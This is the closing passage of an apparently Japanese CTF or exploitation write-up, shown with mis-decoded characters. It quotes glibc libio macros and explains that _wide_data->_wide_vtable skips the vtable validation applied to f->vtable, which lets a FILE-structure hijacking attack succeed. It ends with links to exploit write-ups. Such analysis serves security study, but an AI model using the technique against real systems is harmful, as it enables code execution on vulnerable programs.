#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```
é‡è¦ãªã®ã¯f->vtableã¨ã¯ç•°ãªã‚Šã€f->_wide_data->_wide_vtableã«ä½•ã‚‚ãƒã‚§ãƒƒã‚¯ãŒãªã„ã“ã¨ã€‚f->vtableã‚’ä½¿ç”¨ã™ã‚‹éš›ã¯_IO_JUMPS_FUNCãƒã‚¯ãƒ­ãŒä½¿ç”¨ã•ã‚Œã¦ãŠã‚Šã€IO_validate_vtableé–¢æ•°ã«ã‚ˆã£ã¦f->vtableãŒ\__libc_IO_vtablesã‚»ã‚¯ã‚·ãƒ§ãƒ³å†…ã«ãªã£ã¦ã„ã‚‹ã‹ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã€‚
```c: libio/libioP.h#107
# define _IO_JUMPS_FUNC(THIS) \
  (IO_validate_vtable                                                   \
   (*(struct _IO_jump_t **) ((void *) &_IO_JUMPS_FILE_plus (THIS)	\
			     + (THIS)->_vtable_offset)))
```
f->_wide_data->_wide_vtableã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆå€¤ã§ã‚ã‚‹_IO_wfile_jumpsã‚‚__libc_IO_vtablesã‚»ã‚¯ã‚·ãƒ§ãƒ³å†…ã«ã‚ã‚‹ã®ã«ãªãœãƒã‚§ãƒƒã‚¯ã•ã‚Œã¦ã„ãªã„ã®ã‹ã¯è¬ã ãŒã€ã“ã®ãŠã‹ã’ã§ä»Šå›ã®æ”»æ’ƒã¯ã†ã¾ãã€‚f->_wide_data->_wide_vtableã«f->vtableåŒæ§˜ã®ãƒã‚§ãƒƒã‚¯ãŒå…¥ã£ãŸå ´åˆã¯ä»Šå›ã®æ”»æ’ƒã¯ã†ã¾ãã„ã‹ãªã„ã€‚

# å‚è€ƒæ–‡çŒ®
https://github.com/shift-crops/CTFWriteups/blob/2023/2023/Ricerca%20CTF/Oath%20to%20Order/exploit_oath-to-order.py?ref=www.ctfiot.com

https://www.ctfiot.com/111898.html

[^1]: https://sourceware.org/pipermail/libc-alpha/2021-July/129193.html 
[^2]: https://ptr-yudai.hatenablog.com/entry/2019/02/12/000202
[^3]:https://patchwork.ozlabs.org/project/glibc/patch/20180525151329.23778403744B5@oldenburg.str.redhat.com/
[^4]: https://blog.kylebot.net/2022/10/22/angry-FSROP/